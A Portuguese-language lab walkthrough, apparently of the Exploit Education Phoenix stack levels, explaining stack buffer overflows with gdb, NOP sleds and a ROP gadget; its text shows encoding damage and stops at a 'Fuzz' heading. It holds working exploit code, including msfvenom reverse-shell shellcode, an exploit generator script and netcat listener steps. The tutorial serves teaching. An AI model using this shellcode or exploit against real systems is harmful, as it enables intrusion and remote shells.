<pre><code class="language-bash">$ python -c &quot;print 'A'*88 + '\x1d\x06\x40'&quot; | ./stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
</code></pre>
<h1><a class="header" href="#-objetivo-4" id="-objetivo-4">üéØ Objetivo</a></h1>
<p>Finalmente! Tudo isso para chegar no BOF SRP (classico) :D</p>
<p>Agora ta na hora de redirecionar o pointer para o nosso codigo malicioso (shellcode) para ganhar uma shell </p>
<h1><a class="header" href="#-dicas-1" id="-dicas-1">üí° Dicas</a></h1>
<p>A instru√ß√£o <code>0xCC</code> (<code>int3</code>) serve para no debugger (como o gdb), para quando o rip chegar nela, a execu√ß√£o pausar (<code>breakpoint</code>). Nos podemos usa-la para testar se
sequer conseguimos executar codigo, ou se o problema ta no shellcode: Se o debugger avisa que teve <code>SIGTRAP</code>, nos temos execu√ß√£o de c√≥digo :D</p>
<p>Banco de dados de shellcode: <a href="http://shell-storm.org/shellcode/files/">shell-storm</a></p>
<h1><a class="header" href="#-exploit-2" id="-exploit-2">üî• Exploit</a></h1>
<h2><a class="header" href="#analisando-o-programa" id="analisando-o-programa">Analisando o programa</a></h2>
<p><code>main()</code> printa o banner e chama <code>start_level()</code></p>
<p><code>start_level()</code> cria um buffer[<strong>128</strong>] e salva o output de <code>gets()</code> (<strong>inseguro</strong>)</p>
<p>Como voc√™ pode ver, n√£o exite <code>complete_level()</code></p>
<p>Para completar, precisamos executar nosso pr√≥prio codigo (<code>shellcode</code>) e conseguir uma shell (uma linha de comando)</p>
<h2><a class="header" href="#agora-em-asm-d-analise-estatica" id="agora-em-asm-d-analise-estatica">Agora em ASM :D (analise estatica)</a></h2>
<p>Normalmente, o gdb printa assim:</p>
<pre><code class="language-x86asm">   0x00000000004005a4 &lt;+0&gt;:	push   rbp
   0x00000000004005a5 &lt;+1&gt;:	mov    rbp,rsp
   0x00000000004005a8 &lt;+4&gt;:	sub    rsp,0x10
</code></pre>
<p>Porem, eu removi os endere√ßos para simplificar, e s√≥ mantive os importantes!</p>
<p>Primeiro, vamos ver main</p>
<pre><code class="language-x86asm">gef&gt; disassemble main
push   rbp
mov    rbp,rsp                    &lt;- Prologo
sub    rsp,0x10
   
   
mov    DWORD PTR [rbp-0x4],edi
mov    QWORD PTR [rbp-0x10],rsi   &lt;- args de puts
mov    edi,0x400620
call   0x400400 &lt;puts@plt&gt;        &lt;- call puts
   
   
mov    eax,0x0                    &lt;- args de start_level (nenhum)
call   0x40058d &lt;start_level&gt;     &lt;- call start_level
   
   
mov    eax,0x0                    &lt;- exit code (codigo de saida, 0=sem erro)
leave                             &lt;- Epilogo  
</code></pre>
<p>Agora vamos ver start_level</p>
<pre><code class="language-x86asm">gef&gt; disassemble start_level 
push   rbp
mov    rbp,rsp                  &lt;- Prologo 
add    rsp,0xffffffffffffff80   
                                
   
lea    rax,[rbp-0x80]         &lt;- rax = Pointer para buffer[128]
mov    rdi,rax                &lt;- rdi = rax

0x000000000040059c &lt;+15&gt;:
call   0x4003f0 &lt;gets@plt&gt;    &lt;- call gets


nop
leave                         &lt;- Epilogo
ret
</code></pre>
<p>Agora vamos adicionar um breakpoint!</p>
<h3><a class="header" href="#breakpoint" id="breakpoint">Breakpoint</a></h3>
<blockquote>
<p>Breakpoint = ponto de pausa</p>
</blockquote>
<p>Antes daquela intru√ß√£o ser executada, sera substituida por <code>0xCC</code>. Isso faz o  debugger pausar a execu√ß√£o do programa naquela instru√ß√£o!</p>
<p>Quando continuamos executando (normalmente o comando √© <strong>continue</strong>), o <code>0xCC</code> √© substituido pela instru√ß√£o certa :D</p>
<p>Se voc√™ esta fora de um debugger, <code>0xCC</code> vai fazer o programa sair com erro</p>
<pre><code class="language-x86asm">gef&gt; b *0x000000000040059c
Breakpoint 1 at 0x40059c
</code></pre>
<p>&quot;b&quot; √© o comando do gdb para adionar um breakpoint \ 
A &quot;*&quot; tem haver com aquele dos pointers \ 
O endere√ßo √© para &quot;<code>call gets</code>&quot;</p>
<blockquote>
<p>Dica: se voc√™ selecionar/sublinhar (clique esquerdo e passa o mouse em cima, voc√™ sabe do que eu to falando), e clicar o bot√£o do meio no mouse (a rodinha) 
o terminal automaticamente da Ctrl-C Ctrl-V naquele valor para voc√™! Ent√£o n√£o precisa copiar o endere√ßo manualmente :D</p>
</blockquote>
<h2><a class="header" href="#agora-vamos-executar-o-programa-analise-dinamica" id="agora-vamos-executar-o-programa-analise-dinamica">Agora vamos executar o programa (analise dinamica)</a></h2>
<p>126 As n√£o causam erro, e 127 As causam... ue, mas pq? n√£o era pra dar erro s√≥ em 128?</p>
<pre><code class="language-bash">$ python3 -c &quot;print('A'*126)&quot; | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education

$ python3 -c &quot;print('A'*127)&quot; | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Segmentation fault
</code></pre>
<p>Isso vai ser muito importante no pr√≥ximo desafio: buffers s√£o terminados com um null byte!</p>
<p>Por enquanto, isso s√≥ nos mostra que o compilador n√£o adicionou nada no meio do caminho entre o buffer e o EBP+EIP Salvos :D</p>
<p>E n√≥s ja sabemos como controlar o EIP, ent√£o agora s√≥ precisamos saber para onde redirecionar a execu√ß√£o :)</p>
<h2><a class="header" href="#encontrar-endere√ßo-do-buffer" id="encontrar-endere√ßo-do-buffer">Encontrar endere√ßo do buffer</a></h2>
<p>Agora dentro do gdb (<strong>gdb stack-five</strong>)</p>
<blockquote>
<p>gef&gt; r &lt;&lt;&lt; $(python3 -c &quot;print('A'*100)&quot;)</p>
<p>r √© o comand do gdb para rodar o programa!
Adicionando &quot;&lt;&lt;&lt;&quot; n√≥s podemos mandar uma string pro input! Tambem funciona com arquivos ( r &lt; nome_do_arquivo ) :D</p>
</blockquote>
<pre><code class="language-x86asm">gef&gt; r &lt;&lt;&lt; $(python3 -c &quot;print('A'*100)&quot;)
Starting program: /opt/phoenix/amd64/stack-five &lt;&lt;&lt; $(python3 -c &quot;print('A'*100)&quot;)
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x000000000040059c in start_level ()

--- Output do gef ---
</code></pre>
<blockquote>
<p>gef √© uma extens√£o do gdb que vai te dar um monte de informa√ß√£o util quando voc√™ chegar num breakpoint</p>
</blockquote>
<p>O output do gef contem:
<img src="stack/phoenix/./img/gef_example.png" alt="" />
Porem, mais informa√ß√µes podem ser adicionadas! use <code>gef help</code> para ver como ele pode te ajudar :D </p>
<p>Caso o programa seja executado sem breakpoints e com muitos As, vamos receber uma SIGSEV informando que &quot;$PC&quot;(outro nome para RIP) n√£o pode ser redirecionado para &quot;41414141&quot;, confirmando que o nosso buffer overflow √© possivel (olha as linhas no final da segunda imagem)
<img src="stack/phoenix/./img/stack_five/gef_A_overflow_0.png" alt="" />
<img src="stack/phoenix/./img/stack_five/gef_A_overflow_1.png" alt="" /></p>
<p>Agora, vamos colocar o breakpoint em <code>call gets()</code> e executar o programa com 140 As
<img src="stack/phoenix/./img/stack_five/before_gets_0.png" alt="" /></p>
<p>As partes importante no output do gef s√£o:</p>
<p>registers
<img src="stack/phoenix/./img/stack_five/before_gets_3.png" alt="" /></p>
<p>argumentos (vazio: o pointer em RDI aponta para <strong>0x00007fffffffe5b0</strong>, que possui o valor 0x0000...,)
<img src="stack/phoenix/./img/stack_five/before_gets_1.png" alt="" /></p>
<blockquote>
<p>Lembrete de que pointer come√ßa com 2 NULL bytes ai :D 0x<strong>0000</strong>7fff....</p>
</blockquote>
<p>stack
<img src="stack/phoenix/./img/stack_five/before_gets_2.png" alt="" /></p>
<p>Voc√™ tambem acha que tem uma falta de AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ?? hehehe :P</p>
<p>(((Insira aquele meme muito velho da cabra gritando)))</p>
<p>Ent√£o vamos avan√ßar para pr√≥xima instru√ß√£o (step: <code>s</code>) :D
<img src="stack/phoenix/./img/stack_five/gef_after_gets_0.png" alt="" /></p>
<p>Isso quer dizer que aquele pointer dos argumentos (RDI) agora aponta para os As! :D</p>
<pre><code class="language-x86asm">gef&gt; x/s 0x00007fffffffe5b0              -&gt; x/s √© o comando para printar strings
0x7fffffffe5b0:	'A' &lt;repete 140 vezes&gt;
</code></pre>
<p>Ent√£o nos ja temos o endere√ßo dos nossos As :D ... que em breve ser√£o shellcode :D</p>
<p>Mas agora precisamos saber com presi√ß√£o quantos As at√© o RIP, <code>info frame</code> vai nos ajudar com isso:</p>
<pre><code class="language-x86asm">gef&gt; info frame
Stack level 0, frame at 0x7fffffffe640:
 rip = 0x4005a1 in start_level  saved rip = 0x4005c7
 called by frame at 0x7fffffffe610
 Arglist at 0x7fffffffe630, args: 
 Locals at 0x7fffffffe630, Previous frame's sp is 0x7fffffffe640
 Saved registers:
  rbp at 0x7fffffffe630, rip at 0x7fffffffe638
</code></pre>
<p>A ultima linha √© a mais importante!</p>
<p>RIP em: <code>0x7fffffffe638</code></p>
<p>Ent√£o para encontrar precisamente quantos As precisamos colocar at√© chegarmos no RIP,
basta subtrair <code>endere√ßo do rip salvo - endere√ßo dos As</code></p>
<pre><code class="language-x86asm">$ python3
&gt;&gt;&gt; 0x7fffffffe638 - 0x00007fffffffe5b0
136
</code></pre>
<p>Para confirmar isso, vamos rodar com 136 As + BBBB</p>
<p><img src="stack/phoenix/./img/stack_five/gef_136A_BBBB.png" alt="" /></p>
<p>RIP = BBBB (42424242) :D</p>
<h2><a class="header" href="#nop-sled" id="nop-sled">NOP sled</a></h2>
<p>Entretando, como nada pode ser simples nesse mundo do desenvolvimento de exploits, n√≥s n√£o conseguimos saber com precis√£o que o buffer vai estar naquela localiza√ß√£o :(</p>
<p>Isso ocorre pois as envs s√£o alocadas na stack. E elas variam muito, por exemplo, s√≥ de mudar o local de onde o programa esta sendo executado quebraria o nosso exploit.</p>
<blockquote>
<p>Dica: O gef pode nos ajudar a encontra-las
<img src="stack/phoenix/./img/stack_five/gef_envs_1.png" alt="" /></p>
</blockquote>
<p>Por exemplo:</p>
<p><img src="stack/phoenix/./img/stack_five/gef_envs_0.png" alt="" /></p>
<p>Para remediar isso, podemos usar um NOP sled (ou NOP slide) ! :D</p>
<p>(Outro metodo de remedia√ß√£o √© mencionado em <code>stack-six</code>)</p>
<p>NOP significa &quot;<strong>No</strong> <strong>OP</strong>eration&quot; (<strong>N</strong>enhuma <strong>OP</strong>era√ß√£o) ! √© uma instru√ß√£o que n√£o faz nada :D</p>
<p>A representa√ß√£o em machine code do NOP √© <code>0x90</code> :D Bem f√°cil de decorar, quem me dera escola fosse f√°cil assim hehehe :)</p>
<p>O processador vai fazer nada e passar para a pr√≥xima, e se n√≥s colocarmos varios desses em sequencia, o RIP vai &quot;deslizando&quot; atrav√©s at√© chegar no nosso c√≥digo!</p>
<p>Voc√™ pode imaginar um escorregador :D yuuuuupiii</p>
<p><img src="stack/phoenix/./img/panda_slide_1.gif" alt="" /></p>
<p>Ent√£o a gente redireciona o RIP para o meio do escorregador de NOPs, para ele delizar at√© o nosso c√≥digo :D</p>
<p>Assim, mesmo se o buffer estiverem em um endere√ßo diferente, o RIP vai chegar no nosso shellcode</p>
<p>Para testar isso, vamos usar o truque do <code>0xCC</code> mencionado anteriormente</p>
<p>O input que vai passar vai conter:</p>
<pre><code class="language-x86asm">NOP * 135
0xCC
Ender√ßo para ser colocado no RIP: 0x00007fffffffe5b0 + 70

70 = metade do escorregador (135)
</code></pre>
<p>E os <strong>breakpoints do gdb ser√£o removidos</strong>, ent√£o caso encontremos um breakpoint, foi o <code>0xCC</code> acima</p>
<pre><code class="language-x86asm">$ python3
&gt;&gt;&gt; hex(0x00007fffffffe5b0 + 70)
'0x7fffffffe5f6'                     - Little Endian -&gt; '\xb6\xe5\xff\xff\xff\x7f'
</code></pre>
<p>Agora executando:</p>
<pre><code class="language-x86asm">r &lt;&lt;&lt; $(python -c &quot;print '\x90' *135 + '\xcc' +'\xb6\xe5\xff\xff\xff\x7f'&quot;)
</code></pre>
<p>Nos recebemos uma SIGTRAP (chegou no breakpoint)</p>
<pre><code class="language-x86asm">[#0] Id 1, Name: &quot;stack-five&quot;, stopped, reason: SIGTRAP
</code></pre>
<p>E na se√ß√£o <code>code</code> do gef
<img src="stack/phoenix/./img/stack_five/gef_run_xCC.png" alt="" />
Meio dificil de ver, mas tem:</p>
<pre><code class="language-x86asm">NOP
NOP
INT3
(bad)
(bad)
</code></pre>
<blockquote>
<p>int3 √© o nome de 0xCC, da mesma maneira que NOP √© o nome de 0x90 </p>
</blockquote>
<p>Apos a nossa ultima intru√ß√£o ha intru√ß√µes invalidas <code>(bad)</code> que eram o nosso pointer, e logo em seguida o resto do programa normal! :D</p>
<h2><a class="header" href="#shellcode" id="shellcode">Shellcode</a></h2>
<p>Shellcode √© o codigo malicioso que vai ser executado ( normalmente te dando uma shell (terminal) n√£o autorizada )</p>
<p>Nos podemos usar os do link citado na dica, ou gerar uma usando <code>msfvenom</code> (ja vem instalado no kali linux)</p>
<blockquote>
<p>msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform linux -a x64 -f python --var-name buf</p>
</blockquote>
<pre><code>No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of python file: 373 bytes
buf =  b&quot;&quot;
buf += b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += b&quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += b&quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += b&quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += b&quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += b&quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

</code></pre>
<p>Agora, vamos fazer um exploit mais bem feito! <code>vim /tmp/gerar_exploit.py</code></p>
<pre><code class="language-python">buf =  b&quot;&quot;

# shellcode
buf += b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += b&quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += b&quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += b&quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += b&quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += b&quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# NOP Sled para completar o resto do tamanho
buf = '\x90'*(136-len(buf)) + buf

# ret
buf += b'\xb6\xe5\xff\xff\xff\x7f' 


open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<blockquote>
<p>O script /tmp/gerar_exploit.py vai gerar o que colocariamos no input, mas ao enves de printarmos para o terminal, vamos salvar em um arquivo binario (por isso o &quot;<code>wb</code>&quot; no <code>open</code>)! </p>
<p>Depois √© s√≥ ler esse arquivo e redireciona-lo <code>cat /tmp/exploit | ./stack-five</code> </p>
</blockquote>
<p>Porem, se tentamos executar esse exploit, recebemos <code>SIGSEV: viola√ß√£o de segmento</code></p>
<h2><a class="header" href="#corrigindo-o-problema" id="corrigindo-o-problema">Corrigindo o problema</a></h2>
<p>Nessa eu empaquei, e a solu√ß√£o veio daqui: <a href="https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-five-solution/">blog lamarranet</a></p>
<p>Ent√£o valeu pela ajuda :D</p>
<p>Ao enves de colocar o endere√ßo do buffer diretamente no RIP, vamos achar algo no programa original que aponte para ele: um <code>jmp esp</code> por exemplo</p>
<p>E o beneficio √© que, por estarmos pulando para uma parte estatica, e usando-a para redirecionar para o buffer, n√£o corremos o risco do buffer mudar de endere√ßo!</p>
<p>Isso quer dizer que n√£o precisamos mais do NOP slide :D </p>
<h3><a class="header" href="#rop-gadgets" id="rop-gadgets">ROP Gadgets</a></h3>
<p>Essa √© uma tecnica chamada programa√ß√£o <code>ROP</code>, que sera discutida em tutoriais futuros :D  Mas o que voc√™ precisa saber por enquanto √© que cada um desses <code>jmps</code> √© chamado de <strong>gadget</strong></p>
<p>Gadgets s√£o instru√ß√µes em outras partes do programa, que s√£o reaproveitadas por nos. Geralmente executar algo e pular para outro gadget!</p>
<p>Para achar esse jmp que nos ajudaria, podemos usar uma ferramenta chamda <code>ROPgadget</code></p>
<pre><code class="language-x86asm">$ ROPgadget --binary stack-five --only &quot;jmp&quot;
Gadgets information
============================================================
0x0000000000400481 : jmp rax

Unique gadgets found: 1
</code></pre>
<p>Isso quer dizer que, ao pular para <code>0x400481</code>, vamos executar <code>jmp rax</code> e acabar pulando para rax! e para onde rax aponta?</p>
<p>Colocando um break antes do ret de <code>start_level</code>, podemos ver que antes de retornar, rax aponta para o mesmo endere√ßo que rsp, e convenientemente o incio do nosso buffer
<img src="stack/phoenix/./img/stack_five/gef_rax.png" alt="" /></p>
<p>rax,rdi e rsp apontam para o inicio do buffer dos As</p>
<p>Assim, n√£o vamos mais precisar do NOP slide: temos um exploit que 100% dos casos vai apontar para o inicio do buffer!</p>
<p>S√≥ precisamos colocar <code>padding</code> entre o shellcode e o RIP</p>
<p>Ent√£o vamos modificar o exploit :D</p>
<pre><code>Dica: Shellcode+AAAAA+ret, Little Endian, 136 bytes ate RIP

Se voc√™ n√£o quiser ver a solu√ß√£o enquanto tenta!
.
.
.
.
.
.
.
.
.
.
.
</code></pre>
<pre><code class="language-python">buf =  &quot;&quot;

# shellcode
buf += &quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += &quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += &quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += &quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += &quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += &quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# Padding
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40' # Aponta para jmp rax

open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<blockquote>
<p>Eu removi o <strong>b&quot;&quot;</strong> pq tava dando problema :(</p>
</blockquote>
<p>Agora basta gerar o exploit: <code>python /tmp/gerar_exploit.py</code></p>
<p>Abrir um novo terminal: <code>ssh -p 2222 user@localhost</code></p>
<p>Terminal 1: <code>nc -lvnp 4444</code></p>
<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code> </p>
<p>Agora, no terminal 1 deve ter uma shell :D</p>
<p><img src="stack/phoenix/./img/stack_five/Exploit_working.png" alt="" /></p>
<blockquote>
<p>Dica: <code>bash -ip</code> vai deixar a sua shell mais usavel</p>
</blockquote>
<p>Se nos tivessemos executado o programa como root, a nossa shell teria esses privilegios elevados ! :D</p>
<p><img src="stack/phoenix/./img/stack_five/root_exploit.png" alt="" /></p>
<p><code>UID = 0</code> quer dizer que possuimos privilegios de root, mesmo que o <code>whoami</code> n√£o tenha dito root</p>
<p>E se o programa estivesse exposto para a rede, poderiamos conseguir uma root shell remota :D (spoiler para os proximos desafios hehehe)</p>
<hr />
<p>Voc√™ chegou at√© aqui :D</p>
<p>Toma mais um gif de panda como presente</p>
<p><img src="stack/phoenix/./img/panda_slide_0.gif" alt="" /></p>
<h1><a class="header" href="#-solu√ß√£o-5" id="-solu√ß√£o-5">üí´ Solu√ß√£o</a></h1>
<blockquote>
<p>vim /tmp/gerar_exploit.py</p>
</blockquote>
<pre><code>buf =  &quot;&quot;

# shellcode
buf += &quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += &quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += &quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += &quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += &quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += &quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# Filler
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40' # Aponta para jmp rax

open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<p>Agora basta gerar o exploit: <code>python /tmp/gerar_exploit.py</code></p>
<p>Abrir um novo terminal: <code>ssh -p 2222 user@localhost</code></p>
<p>Terminal 1: <code>nc -lvnp 4444</code></p>
<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code> </p>
<p>Agora, no terminal 1 deve ter uma shell :D</p>
<h1><a class="header" href="#-dicas-2" id="-dicas-2">üí° Dicas</a></h1>
<p>Off-by-one BOF</p>
<h1><a class="header" href="#-explica√ß√£o-4" id="-explica√ß√£o-4">üõ∏ Explica√ß√£o</a></h1>
<p>O programa aceita um nome por meio da env <code>ExploitEducation</code>! Esse nome √© usado para gerar uma mensagem de boas vindas! \ 
Esse processo de gerar as mensagens √© vulneravel a buffer overflow!</p>
<h2><a class="header" href="#analisando-o-programa-1" id="analisando-o-programa-1">Analisando o programa</a></h2>
<h3><a class="header" href="#main" id="main">main</a></h3>
<pre><code class="language-C">int main(int argc, char **argv) {
  char *ptr;
  printf(&quot;%s\n&quot;, BANNER);

#ifdef NEWARCH
  if (argv[1]) {
    what = argv[1];
  }
#endif

  ptr = getenv(&quot;ExploitEducation&quot;);
  if (NULL == ptr) {
    // This style of comparison prevents issues where you may accidentally
    // type if(ptr = NULL) {}..

    errx(1, &quot;Please specify an environment variable called ExploitEducation&quot;);
  }

  printf(&quot;%s\n&quot;, greet(ptr));
  return 0;
}
</code></pre>
<p>Main come√ßa definindo um pointer (<code>ptr</code>) e printando o banner</p>
<p>Em seguida, faz verifica√ß√µs relacionadas √† arquitetura do sistema usando o diretivo:
<code>#ifdef NEWARCH</code>. O diretivo <code>#ifdef NOME</code> checa se a macro chamda <code>NOME</code> existe.</p>
<p>Isso √© usado para tornar o incio da mensagem de boas vindas (gerada por <code>greet</code>) ser dependente da arquitetura!</p>
<p>Por isso nos n√£o a encontramos no codigo fonte! Mas caso usemos <code>strings</code> conseguimos encontra-las no binario:
<img src="stack/phoenix/./img/stack_six/Messages_ARCH.png" alt="Diferen√ßa entre as arquiteturas" /></p>
<p>Em seguida, main salva o valor da env var &quot;ExploitEducation&quot; no pointer ptr</p>
<p>Depois, √© checado se ptr √© NULL (a env var n√£o existe)</p>
<p>Caso n√£o exista: usa a fun√ß√£o errx() para enterromper a execu√ß√£o com uma mensagem de erro! errx() recebe 2 argumento: (codigo_do_erro, mensagem_do_erro)</p>
<p>No nosso caso:</p>
<pre><code class="language-C">  ptr = getenv(&quot;ExploitEducation&quot;);
  if (NULL == ptr) {
    errx(1, &quot;Please specify an environment variable called ExploitEducation&quot;);
  }
    // Codigo de erro: 1
   // Mensagem de erro: Por favor, especifique uma env var chamada ExploitEducation
</code></pre>
<p>Nos podemos confirmar isso usando: <code>echo $?</code>, que printa o codigo retornado pelo ultimo programa
<img src="stack/phoenix/./img/stack_six/Exit_Codes_errx.png" alt="0 = sem erro, 1 = erro" /></p>
<blockquote>
<p>0 = sem erro, 1 = erro</p>
</blockquote>
<p>por ultimo, <code>greet()</code> √© chamada, e o valor retornado por ela √© printado!</p>
<p>E o programa finaliza retornando <code>0</code> (sem erro)!</p>
<h4><a class="header" href="#dica" id="dica">Dica</a></h4>
<p>Para definir uma env var no gdb</p>
<p><img src="stack/phoenix/./img/stack_six/Exit_Codes_gdb.png" alt="set environment ExploitEducation=ABC" /></p>
<blockquote>
<p>set environment ExploitEducation=ABC</p>
</blockquote>
<h3><a class="header" href="#greet" id="greet">greet</a></h3>
<pre><code class="language-C">char *greet(char *who) { // who = nome da pessoa
  char buffer[128];
  int maxSize;

  maxSize = strlen(who);
  if (maxSize &gt; (sizeof(buffer) - /* garantir termina√ß√£o com null */ 1)) {
    maxSize = sizeof(buffer) - 1;
  }

  strcpy(buffer, what);			// Inicio da mensagem de boas vindas
  strncpy(buffer + strlen(buffer), who, maxSize);

  return strdup(buffer);
}
</code></pre>
<p>Agora chega a parte vulneravel! D:</p>
<p>A fun√ß√£o <code>greet</code> recebe um argumento: &quot;who&quot; (quem recebe a mensagem de boas vindas)</p>
<p>S√£o definidas duas variaveis locais: <code>buffer[128]</code> e <code>maxSize</code> (tamanho maximo)</p>
<p>O tamanho de <code>who</code> √© salvo em <code>maxSize</code></p>
<blockquote>
<p>Lembrete: Buffers s√£o terminados com um NULL byte, portanto um buffer[128] s√≥ armazena 127 letras!</p>
</blockquote>
<p>Em seguida, √© checado se <code>maxSize</code> √© maior que o <code>tamanho(buffer) - 1</code> (-1 por causa no null byte final)</p>
<p>Caso seja maior, <code>maxSize</code> vai ser denifido como o <code>tamanho(buffer) - 1</code> (maxSize = 127)</p>
<blockquote>
<p>Portando, o limite de maxSize √© 127</p>
</blockquote>
<p>Essa √© uma tentativa de prevenir o buffer overflow! Pois, s√≥ seriam copiados 127 bytes, impedindo o overflow D:</p>
<p>Mas aqui que entra o problema: essa contagem n√£o leva em considera√ß√£o o inicio da mensagem (<code>what</code>)! Aquele que era dependente da arquitetura :D</p>
<p>Ent√£o nos vamos acabar escrevendo fora do buffer! Aqui esta a parte do codigo que causa a vulnerabilidade</p>
<pre><code class="language-C">strcpy(buffer, what); // what = incio da mensagem
strncpy(buffer, who, maxSize); // who = o valor de ExploitEducation! Quem recebe o oi :D
</code></pre>
<p>Nos ja sabemos como o <code>strcpy</code> funciona (voc√™ passa um buffer como alvo e o que vamos salvar nele, ignorando tamanho! 
Caso nos conseguissemos controlar what, poderiamos facilmente exploitar o programa)</p>
<p>str <strong>N</strong> cpy (<code>strncpy</code>) √© similar a <code>strcpy</code>, mas recebe um terceiro parametro: tamanho!</p>
<p>Esse tamanho √© limitado √† 127 (limite de <code>maxSize</code>), ent√£o teoricamente n√£o seria exploitavel :(</p>
<p><strong>Mas espera ai, ja tinha coisa naquele buffer!!! O inicio da mensagem!!!</strong></p>
<p>O tamanho do inicio √© 34 bytes (na vers√£o amd64)</p>
<pre><code class="language-python">$ python3
&gt;&gt;&gt; x = &quot;Welcome, I am pleased to meet you &quot;
&gt;&gt;&gt; len(x)
34
</code></pre>
<p>Isso quer dizer que no buffer cabem 128, mas foram colocados <strong>34 + 127</strong>: Overflow!</p>
<p>Ent√£o se n√£o fosse pelo inicio da mensagem, n√£o seria exploitavel :D</p>
<p>Uma maneira de concertar essa vulnerabilidade seria: <code>strncpy(buffer, who, maxSize - sizeof(buffer))</code> (subtrair o tamanho atual)</p>
<h2><a class="header" href="#analisando-o-programa-asm" id="analisando-o-programa-asm">Analisando o programa (ASM)</a></h2>
<h3><a class="header" href="#main-1" id="main-1">main</a></h3>
<pre><code class="language-x86asm">gef&gt; disassemble main
push   rbp
mov    rbp,rsp                    ; Prologo
sub    rsp,0x20


mov    DWORD PTR [rbp-0x14],edi
mov    QWORD PTR [rbp-0x20],rsi
mov    edi,0x400878
call   0x400530 &lt;puts@plt&gt;        ; printar o banner


mov    edi,0x4008c2               ; o 1¬∫ argumento √© &quot;ExploitEducation&quot;
call   0x400520 &lt;getenv@plt&gt;      ; Le as env vars e coloca &quot;ExploitEducation&quot; em rax


mov    QWORD PTR [rbp-0x8],rax    ; Pointer para rax
cmp    QWORD PTR [rbp-0x8],0x0    ; Compara esse pointer com 0x0 
                                  ; (Teoricamente &quot;cmp rax, 0x0&quot; tambem deveria funcionar,
                                  ; mas salvando nesse pointer, podemos usar o valor depois)

jne    0x4007dd &lt;main+66&gt;         ; Jump not equal (pular se a compara√ß√£o anterior for diferente)
                                  ; Mas pular para onde? Para main+66 (logo depois da mensagem de erro)
                                  ; Ou melhor: Caso ExploitEducation esteja definida, nos n√£o emitimos erro

Essa parte s√≥ executa caso ExploitEducation n√£o exista {
        mov    esi,0x4008d8               ; 2¬∫ argumento
        mov    edi,0x1                    ; 1¬∫ argumento
        mov    eax,0x0                    ; Valor retornado por main
        call   0x400540 &lt;errx@plt&gt;        ; Enterrompe a execu√ß√£o e sai com erro
}



        0x4007dd &lt;main+66&gt;:
mov    rax,QWORD PTR [rbp-0x8]      ; Lembra daquele pointer que salvamos com o rax de getenv() ? 
                                    ; Coloca ele em rax de novo :D

mov    rdi,rax                      ; 1¬∫ argumento: rax (o valor da env ExploitEducation)
call   0x4006fd &lt;greet&gt;             ; Chama greet()
   
mov    rdi,rax                      ; 1¬∫ argumento: O valor que greet retornou (salvo em rax)
call   0x400530 &lt;puts@plt&gt;          ; Printa a mensagem de boas vindas para o terminal
   
   
mov    eax,0x0                      ; Valor retornado por main: 0 (sem erro)
leave                               ; Epilogo
ret    
</code></pre>
<p>N√£o √© t√£o relevante analisar o assembly de greet para entender a vulnerabilidade, dado que temos o codigo fonte!</p>
<p>Mas caso queira, voc√™ pode analisar por conta pr√≥pria e relacionar o ASM com o codigo fonte por treino :D</p>
<h2><a class="header" href="#fuzz" id="fuzz">Fuzz</a></h2>
